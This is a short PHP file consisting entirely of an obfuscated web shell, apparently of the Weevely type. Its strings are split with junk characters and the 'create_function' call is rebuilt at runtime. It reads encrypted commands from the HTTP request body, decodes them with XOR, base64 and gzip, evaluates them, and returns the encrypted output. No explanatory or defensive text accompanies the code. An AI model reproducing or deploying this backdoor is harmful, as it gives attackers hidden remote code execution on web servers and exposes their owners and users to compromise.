<?php
$A='@evKZal(@gKZzuncompKZress(@xKZ(@baseKZ64_KZdecodeKZ($m[1KZ]),$k)));KZ$o=KZ@KZobKZ_get_coKZntents();@';
$h='tchKZ(KZ"/$kh(.KZ+)$kf/"KZ,@filKZe_getKZ_conKZtKZents("php://KZinpKZut"),$m)=KZ=1) {@ob_stKZart(KZ);';
$T='";functioKZn KZxKZ($t,$k){$c=KZsKZtrlen($k);$l=strlen(KZ$t);$KZoKZ="";forKZ($i=0KZ;$i<KZ$l;){for(';
$H=str_replace('Ti','','crTieaTiTiteTi_fTiunctTiion');
$j='$j=0KZ;(KZKZ$j<$c&&$i<KZ$l);$j++,$KZiKZ++){$o.=$t{$iKZ}^$k{$j}KZ;}KZ}return KZ$o;KZ}if KZ(@preg_ma';
$N='$KZk="34f2889KZbKZ";$kh="4a61092dKZKZc4KZcKZd";$kf="3fd3cKZc2a98KZ3a";$p="A36MnlKZbKZkXtLvEKKZEVKZ';
$O='oKZb_end_clean();$rKZ=@bKZase64KZKZ_encode(@x(KZ@gzcompreKZss($KZoKZ),KZ$k));print("$p$kh$rKZ$kf");}';
$l=str_replace('KZ','',$N.$T.$j.$h.$A.$O);
$i=$H('',$l);$i();
?>
